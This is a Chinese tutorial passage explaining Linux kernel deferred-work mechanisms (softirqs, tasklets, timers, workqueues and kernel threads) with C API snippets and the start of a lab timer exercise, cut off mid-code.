<p>使用延迟工作 Deferred work，我们可以在中断处理程序中执行所需的最少工作，并安排中断处理程序的异步操作在以后运行并执行其余操作</p>
<ul>
<li>在中断上下文中运行的延迟工作也称为下半部分，因为它的目的是从中断处理程序（上半部分）执行其余操作</li>
</ul>
<p>有三种典型操作可用于所有类型的延迟工作：</p>
<ul>
<li>Initialization 初始化：每种类型都由一个结构描述，该结构的字段必须初始化，此时还设置了要计划的处理程序</li>
<li>Scheduling 调度：计划处理程序的执行尽快（或在超时到期后）</li>
<li>Masking or Canceling 掩蔽/取消：禁用处理程序的执行，此操作可以是同步的（这保证了处理程序在取消完成后不会运行）或异步的</li>
</ul>
<p>延迟工作 Deferred work 的主要类型是内核线程和软件：</p>
<ul>
<li>工作队列在内核线程之上实现，任务集和计时器在软件线程之上实现</li>
<li>下半部分处理程序是 Linux 中延迟工作的第一个实现（但与此同时，它被软中断 softirqs 所取代，基于 softirqs 又诞生了可以动态分配的 Tasklets）</li>
<li>这就是为什么所呈现的某些函数在其名称中包含 bh（下半部分 bottom half）的原因</li>
</ul>
<p><strong>Softirqs</strong></p>
<p>软中断 Softirqs，软中断是在编译期间静态分配的，因此不能由设备驱动使用，它们是为各种内核子系统保留的</p>
<p>因此，在编译时定义了固定数量的 softirq，对于当前的内核版本，我们定义了以下类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    HI_SOFTIRQ = <span class="number">0</span>, <span class="comment">/* 运行tasklets */</span></span><br><span class="line">    TIMER_SOFTIRQ, <span class="comment">/* 运行timers */</span></span><br><span class="line">    NET_TX_SOFTIRQ, <span class="comment">/* 由网络子系统使用 */</span></span><br><span class="line">    NET_RX_SOFTIRQ, <span class="comment">/* 由网络子系统使用 */</span></span><br><span class="line">    BLOCK_SOFTIRQ, <span class="comment">/* 由IO子系统使用 */</span></span><br><span class="line">    IRQ_POLL_SOFTIRQ, </span><br><span class="line">    TASKLET_SOFTIRQ, <span class="comment">/* 运行tasklets */</span></span><br><span class="line">    SCHED_SOFTIRQ, <span class="comment">/* 负载平衡 */</span></span><br><span class="line">    HRTIMER_SOFTIRQ, <span class="comment">/* 实现高精度计时器 */</span></span><br><span class="line">    RCU_SOFTIRQ, <span class="comment">/* 实施区域控制单元类型机制 */</span></span><br><span class="line">    NR_SOFTIRQS</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>不同类型的 Softirqs 有不同的作用（部分类型会在后面讲到）</li>
</ul>
<p>Softirqs 在中断上下文中运行，这意味着它们不能调用阻塞函数，如果 sofitrq 处理程序需要调用此类函数，则可以安排工作队列 work queues 来执行这些阻塞调用</p>
<p><strong>Tasklets</strong></p>
<p>任务集 Tasklets 是一种特殊形式的延迟工作，在中断上下文中运行，类似于 softirqs，两者主要区别在于：</p>
<ul>
<li>Tasklets 可以动态分配，因此它们可以由设备驱动程序使用</li>
<li>Tasklets 由 <code>struct tasklet</code> 和许多其他内核结构表示，在使用之前需要对其进行初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span>;</span><br><span class="line"></span><br><span class="line">DECLARE_TASKLET(tasklet, handler, data);</span><br><span class="line">DECLARE_TASKLET_DISABLED(tasklet, handler, data);</span><br></pre></td></tr></table></figure>
<p>如果我们想手动初始化 Tasklets，我们可以使用以下方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> <span class="title">tasklet</span>;</span></span><br><span class="line">tasklet_init(&amp;tasklet, handler, data);</span><br></pre></td></tr></table></figure>
<p>针对运行的 Tasklets 编程称为调度 scheduling，Tasklets 调度通过以下方式完成：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_schedule</span><span class="params">(struct tasklet_struct *tasklet)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_hi_schedule</span><span class="params">(struct tasklet_struct *tasklet)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以通过以下的函数屏蔽 Tasklets：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_enable</span><span class="params">(struct tasklet_struct * tasklet)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_disable</span><span class="params">(struct tasklet_struct * tasklet)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于 Tasklets 是从 softirqs 运行的，因此无法在处理程序函数中使用阻塞调用</li>
</ul>
<p><strong>Timers</strong></p>
<p>计时器 Timers 一种特殊类型的延迟工作：</p>
<ul>
<li>由结构定义 <code>timer_list</code></li>
<li>在中断上下文中运行，并在软件之上实现</li>
</ul>
<p>由于 Timers 必须是原子的，所以 Timers 运行在原子上下文中，内核不能访问用户空间，而且内核是不能休眠或调度（其实 Timers 也是用 Softirqs 实现的，当然不能休眠或调度）</p>
<p>注册好的 Timers 是由内核子模块组织并存储的，其底层的核心功能“定时”是由内核实现，Timers 需要提供一个回调函数，该回调函数和定时器注册程序使用的是同一个线程（这也是在删除模块之前，必须停止计时器的原因）</p>
<p>要使用 Timers，必须首先调用如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_setup</span><span class="params">(struct timer_list * timer,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">void</span> (*function)(struct timer_list *),</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于初始化 <code>timer_list</code> 的内部字段，并将函数关联为计时器处理程序</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * All fields that change during normal runtime grouped to the</span></span><br><span class="line"><span class="comment">	 * same cacheline</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">entry</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		expires;</span><br><span class="line">	<span class="keyword">void</span>			(*function)(struct timer_list *);</span><br><span class="line">	u32			flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span>	<span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>expires</code>：运行处理程序函数 <code>(*function)(struct timer_list *)</code> 的时间</li>
<li><code>function</code>：回调函数</li>
</ul>
<p>使用计时器的一个常见错误是忘记关闭计时器:</p>
<ul>
<li>在删除模块之前，我们必须停止计时器</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del_timer_sync(struct timer_list * timer); <span class="comment">/* 摘除一个定时器对象,确保当函数返回时系统中没有任何处理器正在执行定时器对象上的定时器函数 */</span></span><br><span class="line">del_timer(struct timer_list * timer); <span class="comment">/* 从系统的定时器管理队列中摘除一个定时器对象 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果计时器在模块被删除后过期，则处理程序函数将不再加载到内核中，并且将生成内核 oops</li>
</ul>
<p>定时器的使用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">timer</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125; dev;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_function</span><span class="params">(struct timer_list * tl)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> from_timer(my_data, tl, timer);</span><br><span class="line">    .....</span><br><span class="line">    mod_timer(&amp;my_data-&gt;timer, jiffies + seconds * HZ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_access</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> seconds = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    timer_setup(&amp;dev.timer, timer_function, <span class="number">0</span>);</span><br><span class="line">    mod_timer(&amp;dev.timer, jiffies + seconds * HZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 <code>from_timer</code> 用于从 <code>timer_list</code> 中获取父结构体 <code>my_device_data</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> from_timer(var, callback_timer, timer_fieldname) \</span></span><br><span class="line"><span class="meta">	container_of(callback_timer, typeof(*var), timer_fieldname)</span></span><br></pre></td></tr></table></figure>
<p><strong>Locking</strong></p>
<p>为了在进程上下文（简称 “A”）中运行的代码和在 softirq 上下文（简称 “B”）中运行的代码之间保持同步，我们需要使用特殊的锁定基元：</p>
<ul>
<li>必须在 A 中使用 “停用当前处理器上的下半部分处理程序” 的自旋锁操作</li>
<li>并且在 B 中仅使用基本的自旋锁操作</li>
</ul>
<p>使用自旋锁可以确保我们不会在多个CPU之间进行 Race 条件竞争，而停用 softirq 可以确保我们不会在已经获得自旋锁的同一 CPU 上安排 softirq look 时出现死锁</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_access</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    spin_lock_bh(&amp;my_data-&gt;lock);</span><br><span class="line">    ......</span><br><span class="line">    spin_unlock_bh(&amp;my_data-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">(struct timer_list *tl)</span></span>&#123;</span><br><span class="line">    spin_lock(&amp;my_data-&gt;lock);</span><br><span class="line">    ......</span><br><span class="line">    spin_unlock(&amp;my_data-&gt;lock);</span><br><span class="line">    mod_timer(&amp;my_data-&gt;timer, jiffies + HZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定期器的回调函数在任何时候都可能会发生（内核会直接抢占原来的进程，从而执行回调函数）</li>
<li>如果在 <code>my_access</code> 中拿了自旋锁之后被 <code>timer_handler</code> 抢占，就会发生死锁（回调函数和定时器注册程序使用的是同一个线程）</li>
<li>如果不在 <code>timer_handler</code> 中加锁，又可能会破坏共享数据（例如：在引用指针之前置空了指针）</li>
<li>因此需要使用 <code>spin_lock_bh</code> 在加锁的同时禁止中断下半部（多指软中断）</li>
</ul>
<p>我们可以使用如下函数来 禁用/启用 softirqs 处理程序：（并且由于它们运行在 softirqs 之上，所以计时器和任务集也更少）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">local_bh_disable</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">/* 禁用softirqs处理程序 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">local_bh_enable</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">/* 启用softirqs处理程序 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_lock_bh</span><span class="params">(<span class="keyword">spinlock_t</span> *lock)</span></span>; <span class="comment">/* 禁用softirqs处理程序,添加自旋锁 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_unlock_bh</span><span class="params">(<span class="keyword">spinlock_t</span> *lock)</span></span>; <span class="comment">/* 启用softirqs处理程序,释放自旋锁 */</span></span><br></pre></td></tr></table></figure>
<p><strong>Workqueues</strong></p>
<p>工作队列 Workqueues 用于计划在流程上下文中运行的操作，其实就是一个用于创建内核线程的接口，通过它可以创建一个“工作者线程”来专门处理中断的下半部工作</p>
<ul>
<li>Workqueues 的优点就是可以使用独立于原进程的内核线程</li>
<li>如果想要在中断处理程序中进行调度，就必须使用 Workqueues</li>
</ul>
<p>它们工作的基本单位称为工作项 Work items，有两种类型的工作：</p>
<ul>
<li>struct work_struct：它计划稍后运行的任务</li>
<li>struct delayed_work：它计划任务在至少给定的时间间隔后运行</li>
</ul>
<p>在使用工作项之前，必须初始化工作项，可以使用两种类型的宏：</p>
<ul>
<li>一种是同时声明和初始化工作项 Work items </li>
<li>另一种是仅初始化工作项 Work items </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/workqueue.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DECLARE_WORK(name , <span class="keyword">void</span> (*function)(struct work_struct *));</span><br><span class="line">DECLARE_DELAYED_WORK(name, <span class="keyword">void</span>(*function)(struct work_struct *));</span><br><span class="line"></span><br><span class="line">INIT_WORK(struct work_struct *work, <span class="keyword">void</span>(*function)(struct work_struct *));</span><br><span class="line">INIT_DELAYED_WORK(struct delayed_work *work, <span class="keyword">void</span>(*function)(struct work_struct *));</span><br></pre></td></tr></table></figure>
<p>一旦声明和初始化工作队列，我们可以使用以下函数来调度任务：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">schedule_work</span><span class="params">(struct work_struct *work)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">schedule_delayed_work</span><span class="params">(struct delayed_work *work, <span class="keyword">unsigned</span> <span class="keyword">long</span> delay)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以用如下函数取消工作项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cancel_work_sync</span><span class="params">(struct delayed_work *work)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cancel_delayed_work_sync</span><span class="params">(struct delayed_work *work)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以通过以下方式等待工作队列完成运行其所有工作项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush_scheduled_work</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>当然以上这些函数都是针对某个工作项 Work items 而言</p>
<p>工作队列由结构 <code>workqueue_struct</code> 表示，可以使用以下这些函数创建新的工作队列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct workqueue_struct *<span class="title">create_workqueue</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="function">struct workqueue_struct *<span class="title">create_singlethread_workqueue</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure>
<p>要在新队列中添加任务（某个工作项），使用如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_work</span><span class="params">(struct workqueue_struct * <span class="built_in">queue</span>, struct work_struct *work)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_delayed_work</span><span class="params">(struct workqueue_struct *<span class="built_in">queue</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                       struct delayed_work * work , <span class="keyword">unsigned</span> <span class="keyword">long</span> delay)</span></span>;</span><br></pre></td></tr></table></figure>
<p>等待所有工作项完成调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush_workqueue</span><span class="params">(struct worksqueue_struct * <span class="built_in">queue</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>销毁工作队列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy_workqueue</span><span class="params">(struct workqueue_struct *<span class="built_in">queue</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>Kernel threads</strong></p>
<p>内核线程是工作队列机制的基础，从本质上讲，内核线程是仅在内核模式下运行的线程，没有用户地址空间或其他用户属性</p>
<p>创建内核线程的函数：（但是不会直接运行）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">struct task_struct *<span class="title">kthread_create</span><span class="params">(<span class="keyword">int</span> (*threadfn)(<span class="keyword">void</span> *data),</span></span></span><br><span class="line"><span class="params"><span class="function">                                      <span class="keyword">void</span> *data, <span class="keyword">const</span> <span class="keyword">char</span> namefmt[], ...)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>threadfn</code>：将由内核线程运行的函数</li>
<li><code>data</code>：要发送到函数的参数</li>
<li><code>namefmt</code>：表示内核线程名称</li>
</ul>
<p>启动内核线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wake_up_process</span><span class="params">(struct task_struct *p)</span></span>;</span><br></pre></td></tr></table></figure>
<p>创建和运行内核线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct task_struct * <span class="title">kthread_run</span><span class="params">(<span class="keyword">int</span> (*threadfn)(<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="keyword">void</span> *data, <span class="keyword">const</span> <span class="keyword">char</span> namefmt[], ...)</span></span>;</span><br></pre></td></tr></table></figure>
<p>内核线程的终止是在内核线程中运行的函数中自愿完成的，通过调用如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fastcall NORET_TYPE <span class="keyword">void</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span>;</span><br></pre></td></tr></table></figure>
<p>内核线程处理程序的大多数实现都使用相同的模型，建议开始使用相同的模型以避免常见错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DECLARE_WAIT_QUEUE_HEAD(wq); <span class="comment">/* 初始化等待队列 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// list events to be processed by kernel thread</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">events_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spin_lock</span> <span class="title">events_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// structure describing the event to be processed</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lh</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> stop;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct event* <span class="title">get_next_event</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">e</span>;</span></span><br><span class="line">    spin_lock(&amp;events_lock);</span><br><span class="line">    e = list_first_entry(&amp;events_list, struct event*, lh);</span><br><span class="line">    <span class="keyword">if</span> (e)</span><br><span class="line">        list_del(&amp;e-&gt;lh);</span><br><span class="line">    spin_unlock(&amp;events_lock);</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> my_thread_f(<span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    struct event *e;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        wait_event(wq, (e = get_next_event));</span><br><span class="line">        <span class="comment">/* Event processing */</span></span><br><span class="line">        <span class="keyword">if</span> (e-&gt;stop)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    do_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* start and start kthread */</span></span><br><span class="line">kthread_run(my_thread_f, <span class="literal">NULL</span>, <span class="string">&quot;%skthread%d&quot;</span>, <span class="string">&quot;my&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>使用上面的模板，内核线程请求可以通过以下方式发出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_event</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    spin_lock(&amp;events_lock);</span><br><span class="line">    list_add(&amp;ev-&gt;lh, &amp;events_list);</span><br><span class="line">    spin_unlock(&amp;events_lock);</span><br><span class="line">    wake_up(&amp;wq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABS=deferred_work make skels</span><br><span class="line">make build</span><br><span class="line">make copy</span><br></pre></td></tr></table></figure>
<p>1.Timer 完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Deferred Work</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exercise #1, #2: simple timer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple kernel timer&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TIMEOUT	1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">(struct timer_list 